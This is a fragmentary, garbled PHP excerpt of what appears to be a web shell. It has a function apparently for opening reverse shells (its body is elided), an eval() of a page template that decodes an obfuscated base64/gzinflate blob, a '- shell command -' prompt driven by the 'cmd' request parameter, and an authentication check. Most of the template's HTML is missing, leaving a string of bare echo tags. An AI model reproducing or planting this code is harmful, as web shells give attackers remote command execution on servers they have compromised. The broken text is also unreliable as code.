...
function rs($rstype,$rstarget,$rscode){
	...
	elseif($lang=="php"){
		eval("?><?php echo $s_title; ?><?php echo $_SERVER['PHP_SELF']."?favicon"; ?><?php echo gzinflate(base64_decode($style)); ?><?php echo $_SERVER['PHP_SELF']."?sorttable"; ?><?php if(isset($_REQUEST['cmd'])) echo "if(document.getElementById('cmd')) document.getElementById('cmd').focus();"; ?><?php if($s_auth){ ?><?php echo $s_name; ?><?php echo $s_ver; ?><?php echo $s_info; ?><?php echo $cwd; ?><?php echo $cwd; ?><?php echo $cwd; ?><?php echo $cwd; ?><?php echo $cwd; ?><?php echo $cwd; ?><?php echo $_SERVER['PHP_SELF']; ?><?php echo $s_prompt; ?><?php
if(isset($_REQUEST['cmd'])) echo "";
else echo "- shell command -";
?><?php echo $cwd; ?><?php echo $s_result; ?><?php }
else{ ?><?php echo $_SERVER['PHP_SELF']; ?><?php echo $s_name; ?><?php echo $s_ver; ?><?php } ?><?php echo date("Y",time())." ".$s_name; ?><?php 
$mtime = explode(" ",microtime());
$s_end = (float)$mtime[0] + (float)$mtime[1]; // to calculate script execution time
echo round($s_end-$s_start,3); ?>